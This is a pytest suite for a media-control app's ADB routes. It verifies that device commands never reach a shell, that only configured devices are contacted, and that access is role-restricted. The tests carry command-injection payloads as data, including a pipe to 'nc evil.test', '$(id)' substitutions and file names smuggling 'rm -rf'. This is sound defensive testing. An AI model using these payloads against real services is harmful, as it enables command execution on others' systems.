"""Prod hotfix: adb routes never run a shell, only talk to configured
devices, and are admin-only."""

import inspect
import json
import subprocess
from types import SimpleNamespace

import pytest

import app.main

LAN = {'REMOTE_ADDR': '192.168.1.20'}
ADMIN = {'id': 1, 'username': 'owner', 'is_admin': True}
MEMBER = {'id': 2, 'username': 'member', 'is_admin': False}

PAYLOADS = [
    '10.0.0.5; id',
    '10.0.0.5;id',
    '10.0.0.5 | nc evil.test 1',
    '10.0.0.5|id',
    '$(id)',
    '10.0.0.5$(touch /tmp/x)',
    '`id`',
    '10.0.0.5`id`',
    '10.0.0.5\nid',
    '10.0.0.5\n',
    '10.0.0.5 && id',
    '10.0.0.5 -s other',
    '-H',
    '10.0.0.5:5555',
    '10.0.0.5/x',
    '10.0.0.99',
    'evil.test',
    'fe80::1%eth0',
    '',
]


@pytest.fixture
def adb(test_app, monkeypatch):
    app.main.settings.update({
        'devices': {'rooms': [
            {'id': 'r1', 'name': 'Living room', 'host': '10.0.0.5', 'connectPort': 5555,
             'devices': [{'id': 'd1', 'host': 'shield.lan', 'services': []}]},
            {'id': 'r2', 'name': 'Den', 'ip': 'fd00::5'},
        ]},
    })
    runs = []
    state = {'user': ADMIN}
    monkeypatch.setattr(app.main, '_get_current_user', lambda: state['user'])

    def fake_run(args, **k):
        runs.append((args, k))
        assert isinstance(args, list), 'subprocess must get an argument list'
        assert not k.get('shell')
        if 'window' in args:
            out = 'junk\n  mCurrentFocus=Window{1 u0 com.plexapp.android/com.plexapp.Main}\nmore'
        else:
            out = ''
        return SimpleNamespace(returncode=0, stdout=out, stderr='')
    monkeypatch.setattr(subprocess, 'run', fake_run)
    monkeypatch.setattr(app.main.subprocess, 'run', fake_run)
    return test_app.test_client(), runs, state


def _activity(client, path, ip):
    from urllib.parse import quote
    return client.get(f'{path}?device_ip={quote(ip)}', environ_base=LAN)


def _control(client, ip):
    return client.post('/api/adb/control', data=json.dumps({'device_ip': ip, 'command': 'play_pause'}),
                       content_type='application/json', environ_base=LAN)


def _subs(client, ip):
    return client.post('/api/plex/playback/subtitles', data=json.dumps({'client_ip': ip}),
                       content_type='application/json', environ_base=LAN)


CALLS = [
    lambda c, ip: _activity(c, '/api/activity', ip),
    lambda c, ip: _activity(c, '/api/adb/shield_activity', ip),
    _control,
    _subs,
]
CALL_IDS = ['activity', 'shield_activity', 'control', 'subtitles']


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
@pytest.mark.parametrize('ip', PAYLOADS)
def test_injection_payloads_never_reach_subprocess(adb, call, ip):
    client, runs, _ = adb
    r = call(client, ip)
    if ip == '':
        # Empty falls back to the configured default device: still a plain list call.
        assert all(isinstance(a, list) for a, _ in runs)
        return
    assert r.status_code == 400, (ip, r.status_code)
    assert runs == []


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
def test_non_admin_gets_403(adb, call):
    client, runs, state = adb
    state['user'] = MEMBER
    assert call(client, '10.0.0.5').status_code == 403
    assert runs == []


@pytest.mark.parametrize('call', CALLS, ids=CALL_IDS)
@pytest.mark.parametrize('ip, target', [
    ('10.0.0.5', '10.0.0.5:'),
    ('shield.lan', 'shield.lan:'),
    ('SHIELD.lan', 'shield.lan:'),
    ('fd00::5', '[fd00::5]:'),
])
def test_configured_devices_work(adb, call, ip, target):
    client, runs, _ = adb
    r = call(client, ip)
    assert r.status_code == 200, r.get_data(as_text=True)
    assert runs
    for args, k in runs:
        assert args[0] == 'adb'
        assert not k.get('shell')
        assert k.get('timeout')
        assert any(a.startswith(target) for a in args)


def test_activity_filters_focus_in_python(adb):
    client, runs, _ = adb
    r = _activity(client, '/api/activity', '10.0.0.5')
    assert r.status_code == 200
    assert r.get_json()['current_package'] == 'com.plexapp.android'
    assert runs[0][0] == ['adb', '-s', '10.0.0.5:5555', 'shell', 'dumpsys', 'window']
    assert runs[1][0] == ['adb', '-s', '10.0.0.5:5555', 'shell', 'dumpsys', 'media_session']


@pytest.mark.parametrize('port', [0, 65536, -1, 'x', True, '5555; id'])
def test_bad_port_rejected(port):
    assert app.main._adb_target('10.0.0.5', port) is None


def test_no_shell_anywhere_in_app():
    import pathlib
    root = pathlib.Path(app.main.__file__).parent
    for f in root.rglob('*.py'):
        src = f.read_text()
        assert 'shell=True' not in src, f
        assert 'os.system(' not in src, f
        assert 'os.popen(' not in src, f

# ---- who may read now-playing (read-only) ------------------------------------

@pytest.fixture
def users(test_app):
    import app.user_auth as ua
    ids = {'owner': ua.create_user('owner', '1234', is_admin=True)['id']}
    ids['approved'] = ua.create_user('approved', '1234')['id']
    ua.save_user_settings(ids['approved'], {'use_shared_server': True, 'plex_access_status': 'approved'})
    ids['unapproved'] = ua.create_user('unapproved', '1234')['id']
    ids['denied'] = ua.create_user('denied', '1234')['id']
    ua.save_user_settings(ids['denied'], {'use_shared_server': False, 'plex_access_status': 'denied'})
    ids['inactive'] = ua.create_user('inactive', '1234', status='pending')['id']
    ua.save_user_settings(ids['inactive'], {'use_shared_server': True, 'plex_access_status': 'approved'})
    return ids


@pytest.mark.parametrize('path', ['/api/activity', '/api/adb/shield_activity'])
@pytest.mark.parametrize('kind, status', [('admin', 200), ('approved', 200), ('unapproved', 403),
                                          ('denied', 403), ('inactive', 403), ('anonymous', 403)])
def test_activity_roles(adb, users, path, kind, status):
    client, runs, state = adb
    state['user'] = (ADMIN if kind == 'admin' else None if kind == 'anonymous'
                     else {'id': users[kind], 'username': kind, 'is_admin': False})
    r = _activity(client, path, '10.0.0.5')
    assert r.status_code == status
    if status == 403:
        assert runs == []
    else:
        assert runs[0][0][:3] == ['adb', '-s', '10.0.0.5:5555']


@pytest.mark.parametrize('kind', ['approved'])
def test_approved_user_still_limited_to_configured_devices(adb, users, kind):
    client, runs, state = adb
    state['user'] = {'id': users[kind], 'username': kind, 'is_admin': False}
    for ip in ('10.0.0.99', '10.0.0.5;id', '$(id)'):
        assert _activity(client, '/api/activity', ip).status_code == 400
    assert runs == []


@pytest.mark.parametrize('call', [_control, _subs], ids=['control', 'subtitles'])
def test_commands_stay_admin_only_for_approved_users(adb, users, call):
    client, runs, state = adb
    state['user'] = {'id': users['approved'], 'username': 'approved', 'is_admin': False}
    assert call(client, '10.0.0.5').status_code == 403
    assert runs == []


@pytest.mark.parametrize('how', ['lan', 'key'])
def test_alfred_still_reads_activity(test_app, users, monkeypatch, how):
    """alfred hits localhost:5001 as the LAN implicit owner or with X-API-Key."""
    app.main.settings.update({'devices': {'rooms': [{'id': 'r1', 'name': 'Living room', 'host': '10.0.0.5'}]}})
    runs = []

    def fake_run(args, **k):
        runs.append(args)
        return SimpleNamespace(returncode=0, stdout='', stderr='')
    monkeypatch.setattr(app.main.subprocess, 'run', fake_run)
    client = test_app.test_client()
    if how == 'lan':
        r = client.get('/api/activity', environ_base={'REMOTE_ADDR': '127.0.0.1'},
                       headers={'Host': 'localhost:5001'})
    else:
        r = client.get('/api/activity', environ_base={'REMOTE_ADDR': '203.0.113.7'},
                       headers={'Host': 'localhost:5001', 'X-API-Key': app.main._SERVICE_API_KEY})
    assert r.status_code == 200, r.get_data(as_text=True)
    # No device_ip: falls back to the first room's host.
    assert runs and runs[0][:2] == ['adb', '-s'] and runs[0][2].startswith('10.0.0.5:')


def test_activity_without_device_ip_uses_first_room_host(adb):
    client, runs, _ = adb
    r = client.get('/api/activity', environ_base=LAN)
    assert r.status_code == 200
    assert runs[0][0][2] == '10.0.0.5:5555'


def test_default_device_ip_reads_host():
    sm = app.main.settings
    sm.update({'devices': {'rooms': [{'id': 'a', 'host': '10.0.0.8'}]}})
    assert sm.get_default_device_ip() == '10.0.0.8'
    sm.update({'devices': {'rooms': [{'id': 'a', 'devices': [{'host': 'tv.lan'}]}]}})
    assert sm.get_default_device_ip() == 'tv.lan'
    sm.update({'devices': {'rooms': [{'id': 'a', 'ip': '10.0.0.9'}]}})
    assert sm.get_default_device_ip() == '10.0.0.9'


# ---- /api/plex/client/control 'back' ------------------------------------------

def _client_back(client, ip):
    return client.post('/api/plex/client/control',
                       data=json.dumps({'client_name': 'Shield', 'action': 'back', 'device_ip': ip}),
                       content_type='application/json', environ_base=LAN)


def test_client_control_admin_only_and_configured(adb, monkeypatch):
    client, _, state = adb
    app.main.settings.update({'plex': {'url': 'http://plex.test', 'token': 't'}})
    sent = []
    import app.adb_utils as au
    monkeypatch.setattr(au, 'send_key_event', lambda h, p, k: sent.append((h, p, k)) or {'ok': True})
    state['user'] = MEMBER
    assert _client_back(client, '10.0.0.5').status_code == 403
    state['user'] = ADMIN
    for ip in ('10.0.0.99', '10.0.0.5;id', '$(id)'):
        assert _client_back(client, ip).status_code == 400
    assert sent == []
    assert _client_back(client, '10.0.0.5').status_code == 200
    assert sent == [('10.0.0.5', 5555, 'back')]


def test_unknown_command_message_is_fixed(adb):
    client, _, _ = adb
    r = client.post('/api/adb/control', data=json.dumps({'device_ip': '10.0.0.5', 'command': '<b>x</b>'}),
                    content_type='application/json', environ_base=LAN)
    assert r.status_code == 400
    assert r.get_json() == {'error': 'Unknown command'}


# ---- arguments after 'adb shell' are re-joined on the device ------------------

EVIL_NAMES = [
    'smb://nas/Movies/A;touch marker;.mkv',
    'smb://nas/Movies/$(id) and `id`.mkv',
    "smb://nas/Movies/It's | rm -rf x & y.mkv",
    'smb://nas/Movies/new\nline.mkv',
]


@pytest.mark.parametrize('url', EVIL_NAMES)
def test_kodi_launch_is_one_quoted_shell_arg(url):
    import shlex
    args = app.main._kodi_launch_args('10.0.0.5:5555', url)
    assert args[:4] == ['adb', '-s', '10.0.0.5:5555', 'shell']
    assert len(args) == 5
    # What the device's sh sees splits back into exactly the intended argv.
    assert shlex.split(args[4]) == ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', url,
                                    '-t', 'video/*', '-n', 'org.xbmc.kodi/.Splash']
    assert f"'{url}'" in args[4] or "'\"'\"'" in args[4]


@pytest.mark.parametrize('uri', ["plex://server://x/library/metadata/5';id;'?autoPlay=1",
                                 'plex://watch/video?uri=a&autoPlay=1&offset=3', 'plex://x/$(id)'])
@pytest.mark.parametrize('extra', [False, True])
def test_plex_deeplink_is_one_quoted_shell_arg(uri, extra):
    import shlex
    args = app.main._plex_deeplink_args('10.0.0.5:5555', uri, extra)
    assert args[:4] == ['adb', '-s', '10.0.0.5:5555', 'shell'] and len(args) == 5
    want = ['am', 'start'] + (['--ez', 'android.intent.extra.START_PLAYBACK', 'true'] if extra else []) + \
        ['-a', 'android.intent.action.VIEW', '-d', uri, 'com.plexapp.android']
    assert shlex.split(args[4]) == want


def test_no_unquoted_dynamic_args_after_adb_shell():
    """Every 'shell' call in app/ is either all literals or one shell_command()."""
    import ast
    import pathlib
    root = pathlib.Path(app.main.__file__).parent
    for f in root.rglob('*.py'):
        for node in ast.walk(ast.parse(f.read_text())):
            if isinstance(node, ast.List) and any(isinstance(e, ast.Constant) and e.value == 'shell'
                                                  for e in node.elts):
                idx = next(i for i, e in enumerate(node.elts) if isinstance(e, ast.Constant) and e.value == 'shell')
                rest = node.elts[idx + 1:]
                dynamic = [e for e in rest if not isinstance(e, ast.Constant)]
                ok = not dynamic or (len(rest) == 1 and isinstance(rest[0], ast.Call)
                                     and getattr(rest[0].func, 'id', getattr(rest[0].func, 'attr', '')) == 'shell_command')
                # keyevent code from a fixed allowlist / str(int) is allowed
                ok = ok or all(isinstance(e, ast.Name) and e.id in ('keycode',) or
                               (isinstance(e, ast.Call) and getattr(e.func, 'id', '') == 'str') for e in dynamic)
                assert ok, f'{f.name}:{node.lineno}'
